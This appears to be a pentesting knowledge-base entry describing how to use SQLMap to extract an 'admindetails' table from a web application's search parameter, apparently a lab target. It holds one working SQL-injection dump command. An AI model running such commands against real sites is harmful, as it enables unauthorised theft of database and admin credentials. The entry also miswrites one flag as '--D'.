---
id: 00be1a21-2bfe-470c-81cc-615e53550c25
name: Using SQLMap to Dump The Database Contents
type: procedure
verified: true
submitted: true
created_at: '2020-08-19T19:04:18.134284+00:00'
updated_at: '2023-05-26T18:21:28.615058+00:00'
platforms:
- Web
tags:
- '[[owasp]]'
- '[[owasp top 10]]'
- '[[SQL]]'
- '[[sqli]]'
- '[[SQL Injection]]'
- '[[SQLMap]]'
- '[[Web Applications]]'
commands:
- '[[SQLMap Command to Dump Database Contents]]'
---

# Using SQLMap to Dump The Database Contents

**Status**: ✓ Verified

## Summary

SQLMap is an automated SQL Injection exploitation tool. This can be used to insert the SQL injection payloads through the application input fields. --D is used to specify the database name, -T to specify table name and --dump to list the contents 

## Description

# Description

SQLMap is an automated SQL Injection exploitation tool. This can be used to insert the SQL injection payloads through the application input fields.

*--D is used to specify the database name, -T to specify table name and --dump to list the contents*



# Procedure



1. Use the below SQLMap command to dump the contents from the database tables.









**Command** ([[SQLMap Command to Dump Database Contents]]):

```bash
sqlmap -u '192.168.43.68/vcart/search.php?term=' -D vulcart -T admindetails --dump
```







## Platforms

- Web

## Commands Used

- [[SQLMap Command to Dump Database Contents]]

## Tags

- [[owasp]]
- [[owasp top 10]]
- [[SQL]]
- [[sqli]]
- [[SQL Injection]]
- [[SQLMap]]
- [[Web Applications]]


